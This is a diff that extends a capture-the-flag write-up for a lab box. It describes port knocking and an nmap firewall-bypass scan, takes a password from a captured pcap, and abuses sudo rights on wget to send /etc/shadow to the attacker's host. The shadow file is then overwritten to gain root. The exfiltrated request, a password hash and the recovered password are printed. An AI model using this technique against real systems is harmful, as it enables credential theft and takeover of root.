@@ -21,7 +21,7 @@ Using `knock` we can allow connection to port 22.
 ```knock works by requiring connection attempts to a series of predefined closed ports. With a simple port knocking method, when the correct sequence of port "knocks" (connection attempts) is received, the firewall opens certain port(s) to allow a connection.```
 after that, we can use firewall-bypass script in nmap.
 
-	nmap --script firewall-bypass -p 21 [IP]
+	nmap --script firewall-bypass [IP]
 nmap result after bypassing the firewall:
 ```bash
 PORT   STATE SERVICE VERSION
@@ -42,5 +42,63 @@ PORT   STATE SERVICE VERSION
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--    1 0        0            5930 Aug 28  2019 login.pcap
 ```
-We can log in into FTP anonymously:
+We can log in into FTP anonymously,we found a file named `login.pcap` we got it using `get`.
+Using strings we can find any readable content in the file.
+We can see a HTTP request using POST method,which is used to submit data to be processed by the resource identified by the URL.
+The body of the request contains the data being sent to the server, in this case the username and password, encoded as `username=kabayla&password=K%40b%40ylA%21`.
+So the decoded password is : `K@b@ylA!`
+We can easily login using `ssh` with this credentials.
+We can use `sudo -l` to list the user's sudo privileges.
+So our user `kabayla` can run `/usr/bin/wget` as root without password.
+Using `wget` we can post some files to our machine using `--post-file` option.
+Starting our listener for port 80 we can get the files that we post from `wget`.
+Doing this trick with /etc/shadow can help us view the password hash. We can crack it or overwrite it.
+We got the POST request:
+```bash
+POST / HTTP/1.1
+User-Agent: Wget/1.19.4 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 172.16.1.203
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1021
 
+root:*:18099:0:99999:7:::
+daemon:*:18099:0:99999:7:::
+bin:*:18099:0:99999:7:::
+sys:*:18099:0:99999:7:::
+sync:*:18099:0:99999:7:::
+games:*:18099:0:99999:7:::
+man:*:18099:0:99999:7:::
+lp:*:18099:0:99999:7:::
+mail:*:18099:0:99999:7:::
+news:*:18099:0:99999:7:::
+uucp:*:18099:0:99999:7:::
+proxy:*:18099:0:99999:7:::
+www-data:*:18099:0:99999:7:::
+backup:*:18099:0:99999:7:::
+list:*:18099:0:99999:7:::
+irc:*:18099:0:99999:7:::
+gnats:*:18099:0:99999:7:::
+nobody:*:18099:0:99999:7:::
+systemd-network:*:18099:0:99999:7:::
+systemd-resolve:*:18099:0:99999:7:::
+syslog:*:18099:0:99999:7:::
+messagebus:*:18099:0:99999:7:::
+_apt:*:18099:0:99999:7:::
+lxd:*:18099:0:99999:7:::
+uuidd:*:18099:0:99999:7:::
+dnsmasq:*:18099:0:99999:7:::
+landscape:*:18099:0:99999:7:::
+sshd:*:18099:0:99999:7:::
+pollinate:*:18099:0:99999:7:::
+ubuntu:!:18136:0:99999:7:::
+ftp:*:18136:0:99999:7:::
+kabayla:$6$MC5Bf0ny.RmVf$q/j4e1ab8xkBF9rRtILPemtZq3BMrPkjK.mCcb7jraCMBswToeYwTtKDqHgwlmNA6sCZv2rlOQ6hdGqv63Aqb1:18136:0:99999:7:::
+Debian-snmp:!:18971:0:99999:7:::
+```
+
+We saved the output in a file named `shadow` in our machine, then we update the hash of root account we haah of kabayla account so they have the same hash, and we can easily log in root using the password of kabayala.
+after editing the hash we can launch http server, and using `wget` we can replace the machine shadow with our modified shadow.
+Then we easily logged in root,and got our flag.
